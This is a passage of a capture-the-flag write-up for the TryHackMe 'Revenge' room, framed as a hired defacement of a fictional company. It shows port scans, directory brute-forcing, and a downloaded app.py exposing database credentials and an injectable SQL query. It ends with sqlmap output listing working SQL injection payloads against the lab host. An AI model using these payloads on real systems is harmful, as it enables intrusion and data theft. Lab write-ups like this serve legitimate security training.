# Revenge — Writeup

## Overview
### Revenge — Writeup
### Revenge — Writeup
----
You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?
---
![123](https://tryhackme-images.s3.amazonaws.com/room-icons/46f132f9d913c89cbe4a3c749c420406.png)
### Message from Billy Joel
Download Task Files
![123](https://image.freepik.com/free-vector/chat-bubble_53876-25540.jpg)
[Image from freepik.com](https://www.freepik.com/free-vector/chat-bubble_2900821.htm#page=1&query=message&position=30)
Billy Joel has sent you a message regarding your mission.  Download it, read it and continue on.
Answer the questions below
Read through your mission and continue
Question Done
### Revenge!
Start Machine
![123](https://image.freepik.com/free-photo/closeup-rubber-duck_53876-32073.jpg)
[Image from freepik.com](https://www.freepik.com/free-photo/closeup-rubber-duck_3011778.htm#page=1&query=rubber%20ducky&position=15)
This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?
There is a sister room to this one. If you have not completed [Blog](https://tryhackme.com/room/blog) yet, I recommend you do so. It's not required but may enhance the story for you.
All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to [Varg](https://tryhackme.com/p/Varg). Thanks for helping me out with this one, bud.
Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ cat qTyAhRp.txt 
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.124.107 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.124.107:22
Open 10.10.124.107:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.124.107 [2 ports]
Discovered open port 22/tcp on 10.10.124.107
Discovered open port 80/tcp on 10.10.124.107
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.124.107
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.124.107.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.124.107
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7253b77aebab22701cf73c7ac776d989 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4hQyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQtJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
|   256 437700fbda42025852127dcd4e524fc3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLoXn9g7XpLLb7UMvm4=
|   256 2b57137cc84f1dc26867283f8e3930ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.124.107/ -w /usr/share/dirb/wordlists/common.txt         
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.107/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.124.107/admin                (Status: 200) [Size: 4983]
http://10.10.124.107/contact              (Status: 200) [Size: 6906]
http://10.10.124.107/index                (Status: 200) [Size: 8541]
http://10.10.124.107/login                (Status: 200) [Size: 4980]
http://10.10.124.107/products             (Status: 200) [Size: 7254]
http://10.10.124.107/static               (Status: 301) [Size: 194] [--> http://10.10.124.107/static/]
Progress: 4614 / 4615 (99.98%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://10.10.124.107/admin --forms --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:11:46 //

[14:11:46] [INFO] testing connection to the target URL
[14:11:47] [INFO] searching for forms
[1/1] Form:
GET http://10.10.124.107/admin?action=
do you want to test this form? [Y/n/q] 
Y
Edit GET data [default: action=]: 
do you want to fill blank fields with random values? [Y/n] Y
[14:12:04] [INFO] using '/home/witty/.local/share/sqlmap/output/results-03122023_0212pm.csv' as the CSV results file in multiple targets mode
[14:12:04] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:12:05] [INFO] testing if the target URL content is stable
[14:12:05] [INFO] target URL content is stable
[14:12:05] [INFO] testing if GET parameter 'action' is dynamic
[14:12:06] [WARNING] GET parameter 'action' does not appear to be dynamic
[14:12:06] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
[14:12:06] [INFO] testing for SQL injection on GET parameter 'action'
[14:12:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:12:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:12:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:12:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:12:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:12:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:12:17] [INFO] testing 'Generic inline queries'
[14:12:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:12:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:12:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:12:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:12:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:12:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[14:12:27] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[14:13:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:13:14] [WARNING] GET parameter 'action' does not seem to be injectable
[14:13:14] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[14:13:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-03122023_0212pm.csv'

[*] ending @ 14:13:14 //

──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.124.107/ -w /usr/share/dirb/wordlists/common.txt -x php,py
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.107/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,py
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.124.107/admin                (Status: 200) [Size: 4983]
http://10.10.124.107/app.py               (Status: 200) [Size: 2371]
Progress: 1974 / 13845 (14.26%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[/tmp]
└─$ wget http://10.10.124.107/app.py 
--  http://10.10.124.107/app.py
Connecting to 10.10.124.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2371 (2.3K) [application/octet-stream]
Saving to: ‘app.py’

app.py               100%[====================>]   2.32K  --.-KB/s    in 0s      

(45.3 MB/s) - ‘app.py’ saved [2371/2371]

                                                                                  
┌──(witty㉿kali)-[/tmp]
└─$ cat app.py            
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)

app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')
```
```text
# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')
```
```text
# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')
```
```text
# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')
```
```text
# Product Route
```
```text
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
```
```text
# Executes the SQL Query
```
```text
# This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
```
```text
# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')
```
```text
# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')
```

## Exploitation
```text
# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500

if __name__ == "__main__":
    app.run('0.0.0.0')

The user input product_id is directly used in the sql query. So this query must be exploitable.

let's do it in products

http://10.10.124.107/products/3'

Don't worry. We have things under control (mostly).

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://10.10.124.107/products/3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:20:28 //

[14:20:29] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[14:20:33] [INFO] testing connection to the target URL
[14:20:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:20:35] [INFO] testing if the target URL content is stable
[14:20:35] [INFO] target URL content is stable
[14:20:35] [INFO] testing if URI parameter '#1*' is dynamic
[14:20:36] [WARNING] URI parameter '#1*' does not appear to be dynamic
[14:20:36] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[14:20:37] [INFO] testing for SQL injection on URI parameter '#1*'
[14:20:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:39] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[14:20:47] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:20:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:21:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:21:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:21:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:21:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[14:21:01] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[14:21:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[14:21:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[14:21:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:03] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:21:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:21:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[14:21:04] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[14:21:05] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:05] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[14:21:05] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[14:21:06] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[14:21:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[14:21:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[14:21:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[14:21:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[14:21:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[14:21:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[14:21:10] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[14:21:10] [INFO] testing 'Generic inline queries'
[14:21:10] [INFO] testing 'MySQL inline queries'
[14:21:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:21:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:21:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:21:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:21:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[14:21:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[14:21:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:21:25] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[14:21:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:21:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:21:25] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:21:26] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[14:21:56] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.124.107:80/products/3 AND 4331=4331

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.124.107:80/products/3 AND (SELECT 2390 FROM (SELECT(SLEEP(5)))VVyB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.124.107:80/products/-1946 UNION ALL SELECT 62,CONCAT(0x716a767a71,0x5973754c534c48716e414741544b69716f6f7a484150425a4955584f757142544566436251575849,0x7162707871),62,62,62,62,62,62-- -
